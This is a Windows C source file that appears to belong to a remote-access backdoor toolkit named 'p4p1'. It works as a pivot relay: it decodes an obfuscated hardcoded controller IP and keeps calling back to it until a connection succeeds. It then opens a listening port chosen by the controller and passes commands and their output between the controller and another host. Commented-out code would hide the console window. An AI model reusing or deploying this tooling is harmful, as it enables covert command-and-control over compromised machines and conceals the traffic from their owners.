#include "p4p1-h_win.h"


int main(int argc ,char *argv[])
{
	/*HWND stealth;
	AllocConsole();
	stealth=FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(stealth, 0);*/

	int portno;
	char portchar[6];
	char ip[16];
	char ipchar[16];
	FILE * fip = fopen("ip.cfg", "r");
	FILE * fp = fopen("port.cfg", "r");

	if(fp == NULL){
		portno = 4442;
	} else {
		int i = 0;
		char c;
		while( ( c = fgetc(fp) ) != EOF ){
			portchar[i] = c;
			i++;
		}
		portchar[i+1] = '\0';

		portno = atoi(portchar);
		fclose(fp);
	}

	if(fip == NULL){
		char ipjib[14] = "97/358/316/213";
		char corip[14];

		int i;

		for(i = 0; i < strlen(ipjib); i++){
			char ch;
			ch = ipjib[i];
			corip[i] = decr(ch);
		}

		strcpy(ip, corip);
		printf("%s", corip);      //If no file set up default ip to prevent errors
	} else {
		int i = 0;
		char c;
		while( (c = fgetc(fip)) != EOF){     // Get char from file while not at EOF
			ipchar[i] = c;
			i++;
		}
		ipchar[i] = '\0';

		strcpy(ip, ipchar);

		fclose(fip);
	}

	//Main vpn program

	WSADATA wsa;
	if(WSAStartup(MAKEWORD(2, 2), &wsa) != NO_ERROR){
		printf("error wsa data");
		return 1;
	}

	SOCKET s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if(s == INVALID_SOCKET){
		printf("Error on socket");
		return 1;
	}

	/* setup variables*/
	int cn;
	int bytesSent, bytesRecv;
	char buf[BUFSIZE];
	char ui[BUFSIZE] = "      _ _       _\n _ __| | | _ __/ |_ ___ __ _ _\n| '_ \\_  _| '_ \\ \\ \\V / '_ \\ ' \\\n| .__/ |_|| .__/_|\\\\_/| .__/_||_|\n|_|       |_|        |_|    \n\0";

	bytesSent = 0;
	bytesRecv = SOCKET_ERROR;

	struct sockaddr_in client;
	client.sin_family = AF_INET;
	client.sin_port = htons(portno);
	client.sin_addr.s_addr = inet_addr(ip);

	int *pbs = &bytesSent;
	int *pbr = &bytesRecv;

	do{
		cn = connect(s, (SOCKADDR*)&client, sizeof(client));
	}while( cn == SOCKET_ERROR );

	// IN SERVER, NOW ACTING LIKE A VPN

	int cportno;
	int nc;

	if(cn != SOCKET_ERROR){
		printf("Sending ui");
		*pbs = send(s, ui, BUFSIZE, 0);
		if( *pbs == SOCKET_ERROR ){
			if(WSAGetLastError() != WSAECONNREFUSED
			|| WSAGetLastError() == WSAECONNRESET){
				return 0;
			} else {
				return 1;
			}
		}

		printf("Sending port\n");
		memset(buf, 0, BUFSIZE);
		strcpy(buf, "[*] Send the port:");
		*pbs = send(s, buf, BUFSIZE, 0);
                if( *pbs == SOCKET_ERROR ){
                        if(WSAGetLastError() != WSAECONNREFUSED
                        || WSAGetLastError() == WSAECONNRESET){
                                return 0;
                        } else {
                                return 1;
                        }
                }

		memset(buf, 0, BUFSIZE);
		while(*pbr == SOCKET_ERROR){
			*pbr = recv(s, buf, BUFSIZE, 0);
			if(*pbr == 0 || *pbr == WSAECONNRESET){
				break;
			}

			if(bytesRecv < 0){
				return -1;
			} else {
				cportno = atoi(buf);
				printf("%d\n", cportno);
			}
		}
	}

	SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if(sock == INVALID_SOCKET){
		WSACleanup();
		return 1;
	}

	printf("Creating server");
	struct sockaddr_in server;
	server.sin_family = AF_INET;
	server.sin_addr.s_addr = INADDR_ANY;
	server.sin_port = htons(cportno);

	char buffer[BUFSIZE];

	if(bind(sock, (SOCKADDR*)&server, sizeof(server)) == SOCKET_ERROR){
		printf("bind failed");
		getchar();
		return 0;
	}
	printf("bind done\n");

	if(listen(sock, 10) == SOCKET_ERROR){
		printf("listen error listening to socket");
		getchar();
	}
	printf("listening\n");

	SOCKET as;
	while(1){
		as = SOCKET_ERROR;
		while(as == SOCKET_ERROR){
			as = accept(sock, NULL, NULL);
		}

		sock = as;
		break;
	}

	printf("Sending 0 to host\n");
	memset(buffer, 0, BUFSIZE);
        buffer[0] = '0';
        *pbs = send(sock, buffer, BUFSIZE, 0);
        if( *pbs == SOCKET_ERROR ){
                if(WSAGetLastError() != WSAECONNREFUSED
                || WSAGetLastError() == WSAECONNRESET){
                        return 0;
                } else {
                        return 1;
                }
        }
	printf("DONE\n");

	printf("RECV UI\n" );
	memset(buffer, 0, BUFSIZE);
	*pbr == SOCKET_ERROR;
	while( *pbr == SOCKET_ERROR ){
		*pbr = recv(sock, buffer, BUFSIZE, 0);
		if( *pbr == 0 || *pbr == WSAECONNRESET){
			break;
		}

		if(*pbr < 0){
			return -1;
		} else {
			*pbs = send(s, buffer, BUFSIZE, 0);
			if( *pbs == SOCKET_ERROR ){
				if(WSAGetLastError() != WSAECONNREFUSED
				|| WSAGetLastError() != WSAECONNRESET){
					return 0;
				} else {
					return 1;
				}
			}
		}
	}
	printf("DONE\n");

	while(cn != SOCKET_ERROR){
		//prompt
		memset(buffer, 0, BUFSIZE);
		*pbr == SOCKET_ERROR;
	        while(*pbr == SOCKET_ERROR){
	                *pbr = recv(sock, buffer, BUFSIZE, 0);
	                if(*pbr == 0 || *pbr == WSAECONNRESET){
	                        break;
	                }

	                if(bytesRecv < 0){
	                        return -1;
	                } else {
	                 	memset(buffer, 0, BUFSIZE);
				*pbs = send(s, buffer, BUFSIZE, 0);
			        if( *pbs == SOCKET_ERROR ){
                        		if(WSAGetLastError() != WSAECONNREFUSED
                        		|| WSAGetLastError() == WSAECONNRESET){
                        		        return 0;
                        		} else {
                        		        return 1;
                        		}
                		}
	                }
	        }
		//recv cmd
		memset(buffer, 0, BUFSIZE);
		*pbr == SOCKET_ERROR;
                while(*pbr == SOCKET_ERROR){
                        *pbr = recv(s, buffer, BUFSIZE, 0);
                        if(*pbr == 0 || *pbr == WSAECONNRESET){
                                break;
                        }

                        if(bytesRecv < 0){
                                return -1;
                        } else {
                                *pbs = send(sock, buffer, BUFSIZE, 0);
                                if( *pbs == SOCKET_ERROR ){
                                        if(WSAGetLastError() != WSAECONNREFUSED
                                        || WSAGetLastError() == WSAECONNRESET){
                                                return 0;
                                        } else {
                                                return 1;
                                        }
                        	}
                        }
                }
		//recv output
		memset(buf, 0, BUFSIZE);
		*pbr == SOCKET_ERROR;
                while(*pbr == SOCKET_ERROR){
                        *pbr = recv(sock, buffer, BUFSIZE, 0);
                        if(*pbr == 0 || *pbr == WSAECONNRESET){
                                break;
                        }

                        if(bytesRecv < 0){
                                return -1;
                        } else {

                                *pbs = send(s, buffer, BUFSIZE, 0);
                                if( *pbs == SOCKET_ERROR ){
                                        if(WSAGetLastError() != WSAECONNREFUSED
                                        || WSAGetLastError() == WSAECONNRESET){
                                                return 0;
					} else {
                                                return 1;
                                        }
                                }
                        }
                }
	}

	close:
	WSACleanup();

	return 0;
}
